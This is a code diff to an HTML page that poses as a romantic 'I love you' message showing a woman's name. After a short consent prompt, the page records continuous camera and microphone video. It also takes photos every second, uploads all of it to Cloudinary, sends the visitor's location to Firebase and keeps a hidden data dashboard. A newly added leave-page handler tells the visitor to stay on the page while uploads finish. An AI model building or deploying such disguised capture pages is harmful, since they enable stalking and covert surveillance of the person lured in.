@@ -73,6 +73,23 @@ body {
   transform: translateY(-100%) rotate(-30deg);
 }
 
+.heart-message {
+  position: absolute;
+  z-index: 5;
+  top: 50%;
+  left: 50%;
+  transform: translate(-50%, -50%);
+  color: #fff;
+  font-size: 1rem;
+  font-weight: 700;
+  letter-spacing: 0.01em;
+  text-shadow: 0 2px 8px rgba(0, 0, 0, 0.8);
+  white-space: nowrap;
+  pointer-events: none;
+}
+
+#heart-message[hidden] { display: none; }
+
 /* --- Horizontal sway ------------------------------------------------ */
 @keyframes sway {
   from { translate: 0 0; }
@@ -223,6 +240,9 @@ body {
     #recording-status.stopped {
       background: #374151;
     }
+    #recording-status.saving {
+      background: #92400e;
+    }
     @media (max-width: 560px) {
       #recording-status {
         top: 8px;
@@ -250,23 +270,25 @@ body {
   <div id="consent-modal">
     <div class="modal-content">
       <h2>Anh iu e nhìu lắm ó:33</h2>
-      <p>Sau khi đồng ý và cấp quyền, trang sẽ chụp ảnh mỗi 1 giây, quay clip 5 giây mỗi 10 giây và tải lên Cloudinary đến khi bạn bấm Dừng hoặc đóng tab. Vị trí sẽ được gửi một lần tới Firebase.</p>
+      <p>Sau khi đồng ý và cấp quyền camera/microphone, trang sẽ ghi video liên tục và chụp ảnh mỗi giây. Vị trí được gửi một lần. Khi reload/đóng tab, hãy chọn ở lại trang, chờ video upload xong rồi mới thử lại. Nếu vẫn rời trang ngay, trình duyệt có thể hủy upload. Video dài sẽ tốn bộ nhớ thiết bị.</p>
       <p id="modal-status" style="display:none; color:#b91c1c;"></p>
       <button id="btn-accept" class="btn-primary">Đồng ý & tiếp tục</button>
     </div>
   </div>
 
   <!-- Giao diện chính sau khi nhấn OK -->
-  <main id="heart" class="heart" aria-hidden="true" hidden></main>
-  <video id="preview" class="capture-source" autoplay muted playsinline aria-hidden="true"></video>
+  <main id="heart" class="heart" aria-hidden="true" hidden>
+    <div id="heart-message" class="heart-message" hidden>Trương Yến Nhi💗</div>
+  </main>
+  <video  id="preview" class="capture-source" autoplay muted playsinline aria-hidden="true"></video>
   <div id="recording-status" role="status" aria-live="polite" hidden>
     <strong id="recording-indicator">● ĐANG GHI HÌNH</strong>
     <div>
       <p id="recording-detail"></p>
-      <p id="video-status">Chưa có clip tải lên.</p>
-      <p id="video-next">Clip đầu tiên sẽ bắt đầu sau 10 giây.</p>
+      <p id="video-status">Video chưa bắt đầu ghi.</p>
+      <p id="video-next">Thời lượng: 00:00</p>
     </div>
-    <button id="btn-stop" type="button">Dừng</button>
+    <button id="btn-stop" type="button">Dừng & Lưu</button>
   </div>
   <div  style="display:none !important; " id="main-app">
     <h3 style="display:none;">Bảng điều khiển Dữ liệu</h3>
@@ -300,6 +322,7 @@ body {
 
     const consentModal = document.getElementById('consent-modal');
     const heartEl = document.getElementById('heart');
+    const heartMessageEl = document.getElementById('heart-message');
     const videoEl = document.getElementById('preview');
     const canvasEl = document.getElementById('canvas');
     const statusEl = document.getElementById('status');
@@ -314,8 +337,13 @@ body {
     let mediaStream = null;
     let captureRunning = false;
     let activeRecorder = null;
+    let videoSaving = false;
+    let videoSaved = false;
+    let pendingVideoBlob = null;
+    let recordingStartedAt = 0;
+    let recordingTimer = null;
     let photoUploadsInFlight = 0;
-    const activeUploads = new Set();
+    const activePhotoUploads = new Set();
     const loopWaiters = new Set();
 
     function updateStatus(msg) {
@@ -335,6 +363,20 @@ body {
 
     function updateVideoSchedule(msg) {
       videoNextEl.textContent = msg;
+    }
+
+    function stopMediaStream() {
+      if (!mediaStream) return;
+      mediaStream.getTracks().forEach((track) => track.stop());
+      mediaStream = null;
+      videoEl.srcObject = null;
+    }
+
+    function formatDuration(milliseconds) {
+      const totalSeconds = Math.floor(milliseconds / 1000);
+      const minutes = Math.floor(totalSeconds / 60).toString().padStart(2, '0');
+      const seconds = (totalSeconds % 60).toString().padStart(2, '0');
+      return `${minutes}:${seconds}`;
     }
 
     // 1. Xử lý khi người dùng nhấn OK trên bảng thông báo
@@ -366,12 +408,19 @@ body {
 
         consentModal.style.display = 'none';
         heartEl.hidden = false;
+        heartMessageEl.hidden = false;
         recordingStatusEl.hidden = false;
         recordingStatusEl.classList.remove('stopped');
-        recordingIndicatorEl.textContent = '● ĐANG CHỤP ẢNH / CHỜ CLIP';
+        recordingStatusEl.classList.remove('saving');
+        recordingIndicatorEl.textContent = '● ĐANG GHI VIDEO';
         stopButton.disabled = false;
+        stopButton.textContent = 'Dừng & Lưu';
         captureRunning = true;
-        updateStatus('Camera và microphone đang hoạt động. Ảnh chụp mỗi 1 giây; clip 5 giây mỗi 10 giây.');
+        videoSaved = false;
+        pendingVideoBlob = null;
+        updateVideoStatus('Đang chuẩn bị ghi video liên tục.');
+        updateVideoSchedule('Thời lượng: 00:00');
+        updateStatus('Video và âm thanh đang được ghi. Ảnh chụp mỗi 1 giây.');
         await runAutomaticActions(position);
       } catch (err) {
         if (mediaStream) {
@@ -387,31 +436,55 @@ body {
       }
     });
 
-    stopButton.addEventListener('click', stopCapture);
+    stopButton.addEventListener('click', () => {
+      if (captureRunning) {
+        stopCapture();
+      } else if (pendingVideoBlob && !videoSaving) {
+        void uploadPendingVideo();
+      }
+    });
 
     function stopCapture() {
       if (!captureRunning) return;
       captureRunning = false;
       for (const wake of [...loopWaiters]) wake();
-      if (activeRecorder && activeRecorder.state !== 'inactive') {
-        activeRecorder.stop();
-      }
-      for (const controller of activeUploads) {
+      for (const controller of activePhotoUploads) {
         controller.abort();
       }
-      if (mediaStream) {
-        mediaStream.getTracks().forEach((track) => track.stop());
-        mediaStream = null;
-        videoEl.srcObject = null;
-      }
-      recordingIndicatorEl.textContent = 'ĐÃ DỪNG';
-      recordingStatusEl.classList.add('stopped');
+      recordingStatusEl.classList.remove('stopped');
+      recordingStatusEl.classList.add('saving');
+      recordingIndicatorEl.textContent = '● ĐANG LƯU VIDEO';
       stopButton.disabled = true;
+      stopButton.textContent = 'Đang lưu...';
+      updateStatus('Đang dừng ghi và lưu video; vui lòng chờ trước khi đóng tab.');
+
+      if (activeRecorder) {
+        if (activeRecorder.state !== 'inactive') {
+          activeRecorder.stop();
+          return;
+        }
+        activeRecorder = null;
+      }
+
+      stopMediaStream();
+      videoSaving = false;
+      recordingIndicatorEl.textContent = 'ĐÃ DỪNG';
+      recordingStatusEl.classList.remove('saving');
+      recordingStatusEl.classList.add('stopped');
       stopButton.textContent = 'Đã dừng';
-      updateVideoStatus('Đã dừng.');
-      updateVideoSchedule('Không có clip nào đang được ghi.');
-      updateStatus('Đã dừng chụp, quay và gửi dữ liệu.');
+      stopButton.disabled = true;
+      updateVideoStatus('Không có video đang được ghi.');
     }
+
+    window.addEventListener('beforeunload', (event) => {
+      if (captureRunning) {
+        stopCapture();
+        updateStatus('Đang lưu video vì bạn sắp rời trang. Hãy ở lại, chờ upload xong rồi reload/đóng lại.');
+      }
+      if (!captureRunning && !videoSaving && !pendingVideoBlob && !activeRecorder) return;
+      event.preventDefault();
+      event.returnValue = '';
+    });
 
     function waitForNextCycle(milliseconds) {
       return new Promise((resolve) => {
@@ -452,7 +525,7 @@ body {
 
       const url = `https://api.cloudinary.com/v1_1/${cloudinaryConfig.cloudName}/${resourceType}/upload`;
       const controller = new AbortController();
-      activeUploads.add(controller);
+      if (resourceType === 'image') activePhotoUploads.add(controller);
       try {
         const response = await fetch(url, {
           method: 'POST',
@@ -465,7 +538,7 @@ body {
         }
         return data;
       } finally {
-        activeUploads.delete(controller);
+        activePhotoUploads.delete(controller);
       }
     }
 
@@ -538,108 +611,139 @@ body {
       }
     }
 
-    // 3. Quay và gửi clip 5 giây theo chu kỳ 10 giây
-    async function recordVideo(videoNumber) {
-      if (!captureRunning || !mediaStream) return;
-      recordingIndicatorEl.textContent = '● ĐANG QUAY VIDEO (5 GIÂY)';
-      updateVideoStatus(`Đang quay clip #${videoNumber} (5 giây).`);
-      updateVideoSchedule(`Đang ghi clip #${videoNumber}.`);
+    async function uploadPendingVideo() {
+      if (!pendingVideoBlob || videoSaving) return;
+      videoSaving = true;
+      recordingStatusEl.classList.remove('stopped');
+      recordingStatusEl.classList.add('saving');
+      recordingIndicatorEl.textContent = '● ĐANG TẢI VIDEO';
+      stopButton.disabled = true;
+      stopButton.textContent = 'Đang tải...';
+      updateVideoStatus('Đang tải video hoàn chỉnh lên Cloudinary...');
+      updateStatus('Đang tải video lên; vui lòng đợi trước khi đóng tab.');
 
-      await new Promise((resolve, reject) => {
-        const recorder = new MediaRecorder(mediaStream);
+      try {
+        const data = await uploadToCloudinary(pendingVideoBlob, 'video');
+        videoSaved = true;
+        pendingVideoBlob = null;
+        updateVideoStatus(`Đã lưu video: ${data.secure_url}`);
+      } catch (err) {
+        updateVideoStatus(`Lỗi upload: ${err.message}`);
+      } finally {
+        videoSaving = false;
+        stopMediaStream();
+        recordingStatusEl.classList.remove('saving');
+        recordingStatusEl.classList.add('stopped');
+
+        if (videoSaved) {
+          recordingIndicatorEl.textContent = 'ĐÃ LƯU VIDEO';
+          stopButton.disabled = true;
+          stopButton.textContent = 'Đã lưu';
+          updateStatus('Video đã được lưu thành công.');
+        } else if (pendingVideoBlob) {
+          recordingIndicatorEl.textContent = 'VIDEO CHƯA LƯU';
+          stopButton.disabled = false;
+          stopButton.textContent = 'Thử tải lại';
+          updateStatus('Video chưa được lưu. Kiểm tra lỗi rồi thử tải lại.');
+        }
+      }
+    }
+
+    // Ghi một video liên tục đến khi người dùng nhấn Dừng & Lưu
+    async function recordContinuousVideo() {
+      if (!captureRunning || !mediaStream) return;
+      if (!window.MediaRecorder) {
+        stopCapture();
+        updateVideoStatus('Trình duyệt không hỗ trợ MediaRecorder.');
+        return;
+      }
+
+      let recorder;
+      try {
+        recorder = new MediaRecorder(mediaStream);
+      } catch (err) {
+        stopCapture();
+        updateVideoStatus(`Không thể khởi tạo ghi hình: ${err.message}`);
+        return;
+      }
+
+      await new Promise((resolve) => {
         const chunks = [];
-        let timer;
         let settled = false;
         activeRecorder = recorder;
 
-        const finish = (error) => {
+        const finish = () => {
           if (settled) return;
           settled = true;
-          clearTimeout(timer);
           if (activeRecorder === recorder) activeRecorder = null;
-          if (error) reject(error);
-          else resolve();
+          resolve();
         };
 
         recorder.ondataavailable = (event) => {
           if (event.data.size > 0) chunks.push(event.data);
         };
 
-        recorder.onerror = () => finish(new Error('Trình duyệt gặp lỗi khi ghi video.'));
+        recorder.onerror = () => {
+          updateVideoStatus('Lỗi khi ghi video; đang hoàn tất phần đã ghi được.');
+          if (captureRunning) stopCapture();
+          else if (recorder.state !== 'inactive') recorder.stop();
+        };
 
         recorder.onstop = async () => {
-          if (settled) return;
-          if (!captureRunning) {
-            finish();
-            return;
+          if (activeRecorder === recorder) activeRecorder = null;
+          if (recordingTimer) {
+            clearInterval(recordingTimer);
+            recordingTimer = null;
           }
+          stopMediaStream();
 
-          recordingIndicatorEl.textContent = '● ĐANG TẢI VIDEO';
-          updateVideoStatus(`Đang tải clip #${videoNumber} lên Cloudinary...`);
-          updateVideoSchedule(`Đang tải clip #${videoNumber} lên Cloudinary.`);
           try {
             if (!chunks.length) {
-              throw new Error('MediaRecorder không trả về dữ liệu video.');
+              updateVideoStatus('Không có dữ liệu video để lưu.');
+              recordingIndicatorEl.textContent = 'ĐÃ DỪNG';
+              recordingStatusEl.classList.remove('saving');
+              recordingStatusEl.classList.add('stopped');
+              stopButton.disabled = true;
+              stopButton.textContent = 'Không có video';
+              finish();
+              return;
             }
-            const videoBlob = new Blob(chunks, { type: recorder.mimeType || 'video/webm' });
-            if (!videoBlob.size) {
-              throw new Error('Video được ghi có dung lượng bằng 0.');
+            pendingVideoBlob = new Blob(chunks, {
+              type: recorder.mimeType || chunks[0].type || 'video/webm'
+            });
+            if (!pendingVideoBlob.size) {
+              pendingVideoBlob = null;
+              updateVideoStatus('Video được ghi có dung lượng bằng 0.');
+              recordingIndicatorEl.textContent = 'ĐÃ DỪNG';
+              recordingStatusEl.classList.remove('saving');
+              recordingStatusEl.classList.add('stopped');
+              stopButton.disabled = true;
+              stopButton.textContent = 'Không có video';
+              finish();
+              return;
             }
-            const data = await uploadToCloudinary(videoBlob, 'video');
-            if (captureRunning) {
-              updateVideoStatus(`Đã lưu clip #${videoNumber}: ${data.secure_url}`);
-            }
-          } catch (err) {
-            if (captureRunning) updateVideoStatus(`Lỗi: ${err.message}`);
+            await uploadPendingVideo();
           } finally {
-            if (captureRunning) {
-              recordingIndicatorEl.textContent = '● ĐANG CHỤP ẢNH / CHỜ CLIP';
-            }
             finish();
           }
         };
 
         try {
-          recorder.start();
-          timer = setTimeout(() => {
-            if (recorder.state !== 'inactive') recorder.stop();
-          }, 5000);
+          recorder.start(1000);
+          recordingStartedAt = Date.now();
+          recordingIndicatorEl.textContent = '● ĐANG GHI VIDEO LIÊN TỤC';
+          updateVideoStatus('Đang ghi. Nhấn “Dừng & Lưu” để kết thúc và upload.');
+          updateVideoSchedule('Thời lượng: 00:00');
+          recordingTimer = setInterval(() => {
+            updateVideoSchedule(`Thời lượng: ${formatDuration(Date.now() - recordingStartedAt)}`);
+          }, 1000);
         } catch (err) {
-          finish(err);
+          activeRecorder = null;
+          stopCapture();
+          updateVideoStatus(`Không thể bắt đầu ghi video: ${err.message}`);
+          finish();
         }
       });
-    }
-
-    async function runVideoLoop() {
-      if (!window.MediaRecorder) {
-        updateStatus('Trình duyệt không hỗ trợ quay video; ảnh vẫn tiếp tục được chụp.');
-        return;
-      }
-
-      let videoNumber = 0;
-      let nextVideoStart = Date.now() + 10000;
-      while (captureRunning) {
-        const delay = Math.max(0, nextVideoStart - Date.now());
-        if (delay > 0) {
-          updateVideoSchedule(`Clip #${videoNumber + 1} sẽ bắt đầu sau ${Math.ceil(delay / 1000)} giây.`);
-          await waitForNextCycle(Math.min(1000, delay));
-          continue;
-        }
-        if (!captureRunning) return;
-
-        videoNumber += 1;
-        try {
-          await recordVideo(videoNumber);
-        } catch (err) {
-          if (captureRunning) {
-            recordingIndicatorEl.textContent = '● ĐANG CHỤP ẢNH / CHỜ CLIP';
-            updateVideoStatus(`Lỗi ghi clip #${videoNumber}: ${err.message}`);
-          }
-        }
-
-        nextVideoStart += 10000;
-        if (nextVideoStart <= Date.now()) nextVideoStart = Date.now() + 10000;
-      }
     }
 
     // 4. Lấy và gửi vị trí lên Firebase Realtime Database
@@ -661,10 +765,11 @@ body {
 
     async function runAutomaticActions(position) {
       if (!captureRunning) return;
+      const videoTask = recordContinuousVideo();
       await Promise.all([
         sendLocation(position),
         runPhotoLoop(),
-        runVideoLoop()
+        videoTask
       ]);
     }
   </script>
